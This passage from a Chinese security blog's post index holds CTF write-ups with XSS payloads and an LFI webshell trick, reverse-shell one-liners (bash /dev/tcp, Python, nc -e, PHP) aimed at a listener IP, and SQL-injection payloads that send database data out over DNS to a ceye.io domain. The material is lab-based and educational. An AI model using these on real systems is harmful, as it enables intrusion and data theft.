同上，不再重复！ 参考： https://www.freebuf.com/column/145988.html","categories":[{"name":"web安全","slug":"web安全","permalink":"http://zzqsmile.top/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://zzqsmile.top/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"CTF入门篇writeup——D0g3 Games","slug":"CTF/CTF入门篇writeup_D0g3Games","date":"2018-10-31T01:00:00.000Z","updated":"2020-04-10T15:24:30.000Z","comments":true,"path":"2018/10/31/CTF/CTF入门篇writeup_D0g3Games/","link":"","permalink":"http://zzqsmile.top/2018/10/31/CTF/CTF%E5%85%A5%E9%97%A8%E7%AF%87writeup_D0g3Games/","excerpt":"今天在网上找到一个CTF的小游戏，题目我做了几道感觉挺简单，很适合入门，之前了解CTF，参加各种杯或者是看各种比赛题的writeup，感觉太难了，想到这我还是决定从点滴做起，记录一下学习过程，同时也想做一套CTF从入门到精通的教程。 网址：http://ctf.d0g3.cn/","text":"今天在网上找到一个CTF的小游戏，题目我做了几道感觉挺简单，很适合入门，之前了解CTF，参加各种杯或者是看各种比赛题的writeup，感觉太难了，想到这我还是决定从点滴做起，记录一下学习过程，同时也想做一套CTF从入门到精通的教程。 网址：http://ctf.d0g3.cn/ 下面就简单记录下每道题的解题过程，希望能一点一点积累知识点 WEB1. _GET 题目地址：http://106.12.21.77:8080/get/get.php 题目分析：很简单了，通过get接受一个变量what，其值等于字符串flag. 解题方法： 2. _POST 题目地址：http://106.12.21.77:8080/post/post.php 题目分析：同理同上，只不过通过POST方式传参。 解题方法： 3. 突破物理极限 题目地址：http://106.12.21.77:8080/length/length.html 题目分析：根据提示输入12345提交，但是由于限制只能输入123，因此一看就知道要绕过限制 解题方法：方法不唯一可以抓包修改，也可以F12修改前端代码。 4. serialize 题目地址：http://120.79.33.253:9001/ 题目分析：题目还是很简单的，通过GET传参字符串str，将其传入的字符串通过unserialize()反序列化，使其反序列化结果值等于$KEY，于是解题方法就是传入事先通过serialize()函数序列化后的字符串。 解题过程： 先写个简单序列化字符串的脚本 aaa.php &lt;?php $key = $_GET[&#39;key&#39;]; $str = serialize($key); echo &quot;$str&quot;; ?&gt; 然后运行脚本，可以得到反序列化字符串脚本 最后我们解题 5. xss1 题目地址：http://206.189.214.99:4080/xss/ 题目分析：这道题是考察xss漏洞的，根据提示弹窗即可，想必也是讲xsspayload作为参数值传入，那就随便输入值提交后先查看看页面源代码吧。 解题方法：根据题目分析，构造payload传入到参数，很简单了。通过测试发现两个输出点，，第一个输出点实体编码了，因此根据第二个输出点构造payload。 1payload: &quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt; 哇，弹出俩QQ，加好友索要flag，666，怎么不弄个公众号自动获取呢？ 有趣的聊天截图，哈哈 6. htmlspecialchars 题目地址：http://120.79.33.253:9004/?id=111 题目分析：哎，真麻烦，目标弹窗加qq，通过测试发现，后台使用htmlspecialchars对&lt;&gt;进行了HTML实体编码 解题方法：标签内构造XSSpayload 1payload: &#39; onmouseover&#x3D;alert(1)&#x2F;&#x2F; 7. 机器人 题目地址： http://106.12.21.77:8080/robots/robots.html 题目分析：这道题凭直觉考察的是robots.txt，简单解释一下就是，为了防止搜索引擎的爬虫，通常在网站目录下会有一个robots.txt文件，来告诉搜索引擎哪些目录允许爬虫。那就试试呗。 解题方法：访问robots.txt文件。果然有收获，发现一个flag.txt的文件，然后顺利访问拿到flag。 8. 爆破拿flag 题目地址：http://106.12.21.77:8080/burp/burp.html 题目分析：也是很简单的一道题，5位数的密码，废话不多说，抓包爆破即可 解题方法： 耐心等待…… 密码：12568 9. 数字比较 题目地址：题目给的地址不能用，但是给了php文件，只能在自己环境里搭建咯。 &lt;?php error_reporting(0); function noother_says_correct($temp) &#123; $flag = &quot;xxxxx&quot;; $one = ord(&#39;1&#39;); //ord — 返回字符的 ASCII 码值 $nine = ord(&#39;9&#39;); //ord — 返回字符的 ASCII 码值 $number = &#39;3735929050&#39;; // Check all the input characters! for ($i = 0; $i &lt; strlen($number); $i++) &#123; // Disallow all the digits! $digit = ord($temp&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; // Aha, digit not allowed! return &quot;flase&quot;; &#125; &#125; if($number == $temp) return $flag; &#125; $temp = $_GET[&#39;password&#39;]; echo noother_says_correct($temp); ?&gt; 题目分析：这道题是数字比较，但是又不允许输入1到9数字，因此可以使用16进制来进行比较，即传入的参数值为3735929050的16六进制deadc0da，传入时候记得前面加0x。 解题方法：payload: ?password=0xdeadc0da 11. 欢迎加入道格小组(伪造数据包来源来源) 题目地址： http://106.12.21.77:8080/referer/referer.php 抓取数据包 题目分析：这么明显的提示，就是伪造IP头部了，又加之提示信息不是从d0g3.cn来的你还想要flag？，很容易拿到flag。 解题方法：伪造数据包头 Referer: d0g3.cn 12. Firefox 题目地址：http://106.12.21.77:8080/firefox.php 题目分析：看起来也很简单，就是伪造浏览器版本信息吧。 解题方法：修改浏览器版本信息为Mozilla/11.0，开始简单改个数字11，结果不行，后来仔细看提示，说只用构造为Mozilla/11.0，不用构造操作系统和协议。 13. IP伪造 题目地址：http://106.12.21.77:8080/x-forwarded-for.php 题目分析：很简单了，伪造IP123Client-Ip: 127.0.0.1X-Forwarded-For: 127.0.0.1Host: 127.0.0.1 解题方法：抓取数据包修改数据包IP地址 15. Match it！(匹配它) 题目地址：http://206.189.214.99:1080/Pr3g_m4atch1/Pr3g_m4atch1.php &lt;?php include &#39;f1agi3hEre.php&#39;; if (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) &#123; $password = $_POST[&#39;password&#39;]; if (0 &gt;= preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)) &#123; echo &#39;Wrong Format&#39;; exit; &#125; while (TRUE) &#123; $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; if ($c &lt; 3) break; if (&quot;42&quot; == $password) echo $flag; else echo &#39;Wrong password&#39;; exit; &#125; &#125; highlight_file(__FILE__); ?&gt; 题目分析：一步一步代码审计吧。 解析如下： 0 &gt;= preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password) //输入的内容必须为12个以上包括12，不包括空格和tab键 $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; //[[:punct:]] 任何标点符号， [[:digit:]] 任何数字， [[:upper:]] 任何大写字母 ， [[:lower:]] 任何小写字母 if (6 &gt; preg_match_all($reg, $password, $arr)) //匹配到的次数要大于6次才能绕过。连续的大写或小写字母都只能算是一次。 $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); foreach ($ps as $pt) &#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; &#125; if ($c &lt; 3) break; //这个好理解，必须要有大小写字母，数字，字符内容三种与三种以上 if (&quot;42&quot; == $password) echo $flag; //最后输入的值还要和42相等。 解题方法：根据以上匹配规则构造出满足需求的payload 可以构造420.000000e-1 //0可以随意添加不影响数值，但是要超过12个字符 太菜了，其他的有点思路但暂时没搞定。","categories":[{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/tags/CTF/"}]},{"title":"优秀博客文章笔记","slug":"其他/优秀博客链接收藏","date":"2018-10-08T01:00:00.000Z","updated":"2019-04-04T13:51:30.000Z","comments":true,"path":"2018/10/08/其他/优秀博客链接收藏/","link":"","permalink":"http://zzqsmile.top/2018/10/08/%E5%85%B6%E4%BB%96/%E4%BC%98%E7%A7%80%E5%8D%9A%E5%AE%A2%E9%93%BE%E6%8E%A5%E6%94%B6%E8%97%8F/","excerpt":"本片文章主要对网上比较好的博客博主网站做个笔记，也算快速导航吧，方便学习","text":"本片文章主要对网上比较好的博客博主网站做个笔记，也算快速导航吧，方便学习 大佬博客 reber 简书：https://www.jianshu.com/u/cc008b01f306 个人：http://wyb0.com/ github:https://github.com/reber0 离别歌 https://www.leavesongs.com/ 友情链接 zksmile 简书：https://www.jianshu.com/u/49a7ed0ab6a3 个人：http://zksmile.me/ Climber giyhub: http://lawlietweb.com/ moxiaoxiihttp://momomoxiaoxi.com/2016/10/22/Websecurity/","categories":[{"name":"其他","slug":"其他","permalink":"http://zzqsmile.top/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"其他","slug":"其他","permalink":"http://zzqsmile.top/tags/%E5%85%B6%E4%BB%96/"}]},{"title":"Linux CentOS查看硬件信息大全","slug":"运维安全/Linux_CentOS查看硬件信息大全","date":"2018-10-03T01:00:00.000Z","updated":"2018-10-03T09:59:22.000Z","comments":true,"path":"2018/10/03/运维安全/Linux_CentOS查看硬件信息大全/","link":"","permalink":"http://zzqsmile.top/2018/10/03/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/Linux_CentOS%E6%9F%A5%E7%9C%8B%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF%E5%A4%A7%E5%85%A8/","excerpt":"今天总结一下在安全运维中对于硬件信息收集过程会用到的linux命令。","text":"今天总结一下在安全运维中对于硬件信息收集过程会用到的linux命令。 1演示环境：CentOS 7 1.CentOS常用命令查看 CPU 123[root@localhost ~]# more &#x2F;proc&#x2F;cpuinfo | grep &quot;model name&quot;model name : Intel(R) Core(TM) i5-4210U CPU @ 1.70GHz[root@localhost ~]# 2.CentOS常用命令查看内存 12345[root@localhost ~]# free -m total used free shared buff&#x2F;cache availableMem: 976 678 70 3 227 82Swap: 2047 4 2043[root@localhost ~]# 3.CentOS常用命令查看cpu是32位还是64位​ 123[root@localhost ~]# getconf LONG_BIT64[root@localhost ~]# 4.使用CentOS常用命令查看当前linux的版本​ 123[root@localhost ~]# cat &#x2F;etc&#x2F;redhat-release CentOS Linux release 7.4.1708 (Core) [root@localhost ~]# 5.使用CentOS常用命令查看内核版本​ 12345[root@localhost ~]# uname -aLinux localhost.localdomain 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux[root@localhost ~]# uname -r3.10.0-693.el7.x86_64[root@localhost ~]# 6.使用CentOS常用命令查看硬盘和分区​​ 123456789101112[root@localhost ~]# df -h文件系统 容量 已用 可用 已用% 挂载点&#x2F;dev&#x2F;mapper&#x2F;centos-root 17G 8.0G 9.1G 47% &#x2F;devtmpfs 473M 0 473M 0% &#x2F;devtmpfs 489M 0 489M 0% &#x2F;dev&#x2F;shmtmpfs 489M 7.2M 482M 2% &#x2F;runtmpfs 489M 0 489M 0% &#x2F;sys&#x2F;fs&#x2F;cgroup&#x2F;dev&#x2F;sda1 1014M 161M 854M 16% &#x2F;boottmpfs 98M 4.0K 98M 1% &#x2F;run&#x2F;user&#x2F;42tmpfs 98M 36K 98M 1% &#x2F;run&#x2F;user&#x2F;0&#x2F;dev&#x2F;sr0 4.3G 4.3G 0 100% &#x2F;run&#x2F;media&#x2F;root&#x2F;CentOS 7 x86_64[root@localhost ~]# 7.使用CentOS常用命令查看selinux情况​ 1234567891011[root@localhost ~]# sestatus SELinux status: enabledSELinuxfs mount: &#x2F;sys&#x2F;fs&#x2F;selinuxSELinux root directory: &#x2F;etc&#x2F;selinuxLoaded policy name: targetedCurrent mode: enforcingMode from config file: enforcingPolicy MLS status: enabledPolicy deny_unknown status: allowedMax kernel policy version: 28[root@localhost ~]# 8.查看IP地址 1[root@localhost ~]# ifconfig 9.使用CentOS常用命令查看所属时区和是否使用UTC时间 CentOS 7查看方法： 12345678910111213141516171819202122232425262728293031323334353637[root@localhost ~]# timedatectl Local time: 三 2018-10-03 17:17:22 UTC Universal time: 三 2018-10-03 17:17:22 UTC RTC time: 三 2018-10-03 17:17:22 Time zone: Universal (UTC, +0000) NTP enabled: noNTP synchronized: no RTC in local TZ: no DST active: n&#x2F;a[root@localhost ~]# date 2018年 10月 03日 星期三 17:17:39 UTC[root@localhost ~]# timedatectl set-timezone Asia&#x2F;Shanghai[root@localhost ~]# timedatectl Local time: 四 2018-10-04 01:18:46 CST Universal time: 三 2018-10-03 17:18:46 UTC RTC time: 三 2018-10-03 17:18:46 Time zone: Asia&#x2F;Shanghai (CST, +0800) NTP enabled: noNTP synchronized: no RTC in local TZ: no DST active: n&#x2F;a[root@localhost ~]# date 2018年 10月 04日 星期四 01:20:02 CST[root@localhost ~]# rm -rf &#x2F;etc&#x2F;localtime [root@localhost ~]# ln -s &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Universal &#x2F;etc&#x2F;localtime[root@localhost ~]# timedatectl Local time: 三 2018-10-03 17:22:44 UTC Universal time: 三 2018-10-03 17:22:44 UTC RTC time: 三 2018-10-03 17:22:43 Time zone: Universal (UTC, +0000) NTP enabled: noNTP synchronized: no RTC in local TZ: no DST active: n&#x2F;a[root@localhost ~]# date 2018年 10月 03日 星期三 17:22:51 UTC[root@localhost ~]# CentOS 6查看方法： 1# cat &#x2F;etc&#x2F;sysconfig&#x2F;clock 10.使用CentOS常用命令查看主机名​ 123[root@localhost ~]# hostnamelocalhost.localdomain[root@localhost ~]# 11.使用CentOS常用命令查看开机运行时间 123[root@localhost ~]# uptime 16:49:14 up 2:22, 2 users, load average: 0.00, 0.01, 0.05[root@localhost ~]# 12.查看主板信息 1234567891011121314151617181920212223242526272829303132333435363738[root@localhost ~]# dmidecode | more# dmidecode 3.0Getting SMBIOS data from sysfs.SMBIOS 2.7 present.620 structures occupying 29060 bytes.Table at 0x000E0010.Handle 0x0000, DMI type 0, 24 bytesBIOS Information Vendor: Phoenix Technologies LTD Version: 6.00 Release Date: 05&#x2F;19&#x2F;2017 Address: 0xEA520 Runtime Size: 88800 bytes ROM Size: 64 kB Characteristics: ISA is supported PCI is supported PC Card (PCMCIA) is supported PNP is supported APM is supported BIOS is upgradeable BIOS shadowing is allowed ESCD support is available Boot from CD is supported Selectable boot is supported EDD is supported Print screen service is supported (int 5h) 8042 keyboard services are supported (int 9h) Serial services are supported (int 14h) Printer services are supported (int 17h) CGA&#x2F;mono video services are supported (int 10h) ACPI is supported Smart battery is supported BIOS boot specification is supported Function key-initiated network boot is supported Targeted content distribution is supported--More-- 13.查看磁盘使用情况 12345678910111213141516171819202122232425[root@localhost ~]# fdisk -l磁盘 &#x2F;dev&#x2F;sda：21.5 GB, 21474836480 字节，41943040 个扇区Units &#x3D; 扇区 of 1 * 512 &#x3D; 512 bytes扇区大小(逻辑&#x2F;物理)：512 字节 &#x2F; 512 字节I&#x2F;O 大小(最小&#x2F;最佳)：512 字节 &#x2F; 512 字节磁盘标签类型：dos磁盘标识符：0x000d1bd6 设备 Boot Start End Blocks Id System&#x2F;dev&#x2F;sda1 * 2048 2099199 1048576 83 Linux&#x2F;dev&#x2F;sda2 2099200 41943039 19921920 8e Linux LVM磁盘 &#x2F;dev&#x2F;mapper&#x2F;centos-root：18.2 GB, 18249416704 字节，35643392 个扇区Units &#x3D; 扇区 of 1 * 512 &#x3D; 512 bytes扇区大小(逻辑&#x2F;物理)：512 字节 &#x2F; 512 字节I&#x2F;O 大小(最小&#x2F;最佳)：512 字节 &#x2F; 512 字节磁盘 &#x2F;dev&#x2F;mapper&#x2F;centos-swap：2147 MB, 2147483648 字节，4194304 个扇区Units &#x3D; 扇区 of 1 * 512 &#x3D; 512 bytes扇区大小(逻辑&#x2F;物理)：512 字节 &#x2F; 512 字节I&#x2F;O 大小(最小&#x2F;最佳)：512 字节 &#x2F; 512 字节[root@localhost ~]# 参考文章：http://zone.secevery.com/article/995","categories":[{"name":"运维安全","slug":"运维安全","permalink":"http://zzqsmile.top/categories/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"运维安全","slug":"运维安全","permalink":"http://zzqsmile.top/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"}]},{"title":"信息收集笔记","slug":"渗透测试/信息收集","date":"2018-09-27T01:00:00.000Z","updated":"2019-03-27T08:11:56.000Z","comments":true,"path":"2018/09/27/渗透测试/信息收集/","link":"","permalink":"http://zzqsmile.top/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"主要收录信息收集方法及传送门 FOCA信息收集神器 123456781. FOCA下载地址：https:&#x2F;&#x2F;github.com&#x2F;ElevenPaths&#x2F;FOCA&#x2F;releases 2. 需要SQL Server环境下载地址：https:&#x2F;&#x2F;www.microsoft.com&#x2F;en-us&#x2F;sql-server&#x2F;sql-server-editions-express3. 需要.NET Framework 4.0下载地址：https:&#x2F;&#x2F;www.microsoft.com&#x2F;en-us&#x2F;download&#x2F;details.aspx?id&#x3D;17851 参考","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://zzqsmile.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[]},{"title":"XJNU-CTF 2018","slug":"CTF/XJNU-CTF_2018","date":"2018-09-25T01:00:00.000Z","updated":"2018-11-26T06:38:02.000Z","comments":true,"path":"2018/09/25/CTF/XJNU-CTF_2018/","link":"","permalink":"http://zzqsmile.top/2018/09/25/CTF/XJNU-CTF_2018/","excerpt":"闲来无事，最近在做CTF题，感觉再不练练手我就废了。","text":"闲来无事，最近在做CTF题，感觉再不练练手我就废了。 1.本地文件包含+文件上传拿flag 地址题目：http://ctf.xjnu.edu.cn:666/ 题目分析： 看到题目，有两种思路：1).利用文件上传拿webshell，然后找到flag; 2).利用文件包含拿webshell，然后找到flag。 目标很明确，思路也有，然后实践操作，结果发现文件上传走不通，然后想利用文件包含漏洞可以读文件，经证实的确可以读取到文件，但是要找flag就比较难了，因为我不知道flag在哪啊！于是就有另一种想法，利用远程文件包含拿webshell，后来经读upload.php源码发现，应该是不能远程文件包含的。那么最后就剩本地文件包含了，正好呢此处可以上传文件，因此先上传一个图片，不过图片内容改为一句话木马，然后包含这个图片，此时图片里面的一句话木马就会被解析执行，这样我们就拿到了webshell. 具体操作如下，正好回顾下基础知识 利用文件包含读本地文件/etc/passwd 由于最后知道了flag文件名和路径，这里就顺便演示下，如下： 读取upload.php文件源码 读取格式 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;文件名 然后base64解码 此时看到upload.php源码，可知文件上传拿webshell是行不通的 同样读取index.php，如下： 然后base64解码 可以看出，此文件包含是对包含文件参数file是做了正则匹配过滤的。 解题 上传图片zzqsmile.jpg，然后抓包写一句话。 上传成功！ 然后包含上传的图片upload/zzqsmile.jpg，如下： ok!下面就可以用菜刀尝试连接了。 nice! 没毛病！ 最后就简单了，找flag。 flag: flag{pHp_Lfi_t0_Be_Shell!} 之前读文件读的就是这个文件。 2.SQL注入拿flag 题目地址： http://ctf.xjnu.edu.cn:9900/web10/ 题目分析： 很明显根据提示信息，此题是道SQL注入的题目，可以看下源码，或者直接可以尝试index.php?id=1。 可以发现，此处可能就是注入点，经确认的确存在注入。 下面就是sql注入流程一顿操作，最后得到flag。 解题完毕！","categories":[{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://zzqsmile.top/tags/CTF/"}]},{"title":"Linux下反弹shell几种方法学习总结","slug":"Linux/2018-09-05-Linux下反弹shell几种方法学习总结","date":"2018-09-05T01:00:00.000Z","updated":"2018-09-05T04:50:18.000Z","comments":true,"path":"2018/09/05/Linux/2018-09-05-Linux下反弹shell几种方法学习总结/","link":"","permalink":"http://zzqsmile.top/2018/09/05/Linux/2018-09-05-Linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","excerpt":"什么是反弹shell？ 简单理解，通常是我们主动发起请求，去访问服务器（某个IP的某个端口），比如我们常访问的web服务器：http(https)://ip:80，这是因为在服务器上面开启了80端口的监听，我们去访问它的时候，就会给我们建立连接。而现在所谓的反弹shell指的是反过来在我们自己的公网vps建立监听，然后让服务器反弹一个shell来连接我们自己的主机，然后我们就能通过反弹的shell去远程控制服务器了。那么关键是怎么做了？今天我也向大佬学习学习总结总结，不足之处还望多多包含。","text":"什么是反弹shell？ 简单理解，通常是我们主动发起请求，去访问服务器（某个IP的某个端口），比如我们常访问的web服务器：http(https)://ip:80，这是因为在服务器上面开启了80端口的监听，我们去访问它的时候，就会给我们建立连接。而现在所谓的反弹shell指的是反过来在我们自己的公网vps建立监听，然后让服务器反弹一个shell来连接我们自己的主机，然后我们就能通过反弹的shell去远程控制服务器了。那么关键是怎么做了？今天我也向大佬学习学习总结总结，不足之处还望多多包含。 实验环境12CentOS 7: 192.168.0.147kali 2.0: 192.168.0.146 方法1：使用linux命令反弹shell反弹shell命令格式如下： 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1 首先在kali上使用nc监听7777端口 1root@kali:~# nc -lvp 7777 然后再CentOS 7下执行以下命令： 1[root@localhost ~]# bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.146&#x2F;7777 0&gt;&amp;1 执行完命令之后再回到kali机器上面查看，可以看到shell成功反弹，这时候我们就能对服务器进行远程操控了 方法2：使用python反弹shell反弹shell命令格式如下： 1python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;ip&#39;,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; 同理，首先在kali上使用nc监听7777端口 1root@kali:~# nc -lvp 7777 然后再CentOS 7下执行以下命令：1[root@localhost ~]# python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.1.146&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;]);&quot; 然后返回kali查看发现也可以成功反弹shell，如下所示： 方法3：使用nc反弹shell，前提这自然是反弹shell的服务器安装有nc才行 首先查看是否安装了nc，我这里已经安装的有了，如下图所示，如果没安装的还请自行百度解决。 然后下一步还是在我们kali上面监听端口。 1root@kali:~# nc -lvp 7777 最后在CentOS上面使用nc反弹shell到kali，命令如下： 1[root@localhost ~]# nc -e &#x2F;bin&#x2F;bash 192.168.1.146 7777 执行完命令之后，返回kali可看到反弹shell成功，并可以执行命令对服务器进行操作，如下图所示： 方法4：使用php反弹shell1).首先最简单的一个办法，就是使用php的exec函数执行方法1反弹shell的命令 第一步还是在kali上面监听端口 1root@kali:~# nc -lvp 7777 然后在CentOS执行以下命令: 1[root@localhost ~]# php -r &#39;exec(&quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.146&#x2F;7777&quot;);&#39; 最后我们回到kali上面查看，即可看到成功反弹的shell 2).使用php的fsockopen去连接远程 命令格式如下： 1php -r &#39;$sock&#x3D;fsockopen(&quot;ip&quot;,port);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; 第一步在kali上面监听端口 1root@kali:~# nc -lvp 7777 然后在CentOS执行以下命令: 1[root@localhost ~]# php -r &#39;$sock&#x3D;fsockopen(&quot;192.168.1.146&quot;,7777);exec(&quot;&#x2F;bin&#x2F;bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; 最后在kali上可以看到成功反弹shell 具体命令详解待续。。。","categories":[{"name":"Linux","slug":"Linux","permalink":"http://zzqsmile.top/categories/Linux/"}],"tags":[{"name":"反弹shell","slug":"反弹shell","permalink":"http://zzqsmile.top/tags/%E5%8F%8D%E5%BC%B9shell/"}]},{"title":"SQL注入奇淫技巧——利用dnslog获取看不到的信息","slug":"web安全/sql盲注奇淫技巧之dnslog","date":"2018-06-18T01:00:00.000Z","updated":"2018-11-26T06:47:22.000Z","comments":true,"path":"2018/06/18/web安全/sql盲注奇淫技巧之dnslog/","link":"","permalink":"http://zzqsmile.top/2018/06/18/web%E5%AE%89%E5%85%A8/sql%E7%9B%B2%E6%B3%A8%E5%A5%87%E6%B7%AB%E6%8A%80%E5%B7%A7%E4%B9%8Bdnslog/","excerpt":"对于sql盲注，常用的方法应该是二分法了，为此之前还写过通过二分法猜解的半自动化python脚本，说实话，python脚本比起手动真的已经是好多了，可是我内心其实还是挺怵写脚本的，而且这种脚本二分法猜解发送的请求频繁麻烦不说，还容易被waf检测到，以至于ip被封。于是最近学习了一种sql盲注的奇淫技巧。","text":"对于sql盲注，常用的方法应该是二分法了，为此之前还写过通过二分法猜解的半自动化python脚本，说实话，python脚本比起手动真的已经是好多了，可是我内心其实还是挺怵写脚本的，而且这种脚本二分法猜解发送的请求频繁麻烦不说，还容易被waf检测到，以至于ip被封。于是最近学习了一种sql盲注的奇淫技巧。 step1. 介绍CEYE平台网址：http://ceye.io/ 点击进去注册一个帐号，这个平台应该是知道创宇的，因为之前注册过，所以这我直接登录即可，大家注册完毕应该和我一样如下图所示： 注册完之后会自动的在一级域名ceye.io下分配一个二级域名如xxxxx.ceye.io 一级域名是要钱的也是人家的，二级域名就不要钱了，你注册一个帐号，它可以给你分配一个二级域名，这个大家应该知道吧，给大家提点一下，希望有助于大家理解. 在这儿，我只给大家简单说一下，这个平台注册完之后你可以理解其为自己的一台dns服务器吧，当你访问你的域名或者有HTTP请求时候，这个地方会记录你访问的日志，要是不明白看如下图示： 下面通过一个简单操作，再次有助大家理解 比如浏览器访问http://zzqsmile.xxxxx.ceye.io/，如下图所示： 然后回头看CEYE，记得reload刷新一下 此时我相信你已经理解这个平台的作用了吧，其实就是一个dns解析服务器，只不过只能访问xxxxx.ceye.io及其子域名，才会产生dns日志而已。其他的暂不解释，接着我们今天要将的SQL盲注奇淫技巧。 step2. load_file(filename)函数 相信学习过通过sql注入读写服务器文件的对这个函数应该不陌生，在这我再简单提一下这个函数的作用。 load_file(filename)读取文件并返回文件内容为字符串.使用此函数需要满足以下条件: (1).所读文件必须在服务器上，且必须指定文件其绝对路径 (2).连接当前数据库用户必须有FILE权限 (3).文件内容必须小于max_allowed_packet。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。 实际上load_file()函数还可以用来发送dns解析请求，接下来就实际尝试一下。 利用的payload是 1select load_file(concat(&#39;\\\\\\\\\\\\\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\\\\abc&#39;)) database()就是要做sql注入查询的地方。concat是字符串拼接后面的abc可以改也可以不改，无所谓的，你乐意写啥就写啥 上面拼接的结果就是’\\\\\\\\ schema_name.XXXX.ceye.io\\\\abc’，其实相当于访问了带有数据库名称的三级域名，被dnslog捕获到了 step3. sqli-labs靶场练习 sqli-labs/第五关就是sql盲注，就拿这个来练习一下今天学的这个奇淫技巧吧。payload: 1?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select database()),&#39;.xxxxx.ceye.io\\\\abc&#39;))),1,1)--+ 获取当前数据库 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select database()),&#39;.xxxxx.ceye.io\\\\abc&#39;))),1,1)--+ 获取数据库版本 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select version()),&#39;.xxxxx.ceye.io\\\\abc&#39;))),1,1)--+ -获取数据库security中的表 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),&#39;.xxxxx.ceye.io\\\\abc&#39;))),1,1)--+ 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 1,1),&#39;.xxxxx.ceye.io\\\\abc&#39;))),1,1)--+ 值得说的是，这种方法不能同时查询多个结果，因此需要使用limit来控制每次查询一条结果。 当然此时有人可能疑问到底有多少张表呢？没错使用count()，我尝试一下是可以查询到有几张表的。如下所示： 1http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),&#39;.xxxxx.ceye.io\\\\abc&#39;))),1,1)--+ 同理查询字段也类似而已，但是经本人测试，查询user()时候就没查询出来。这是为什么呢? 因为select 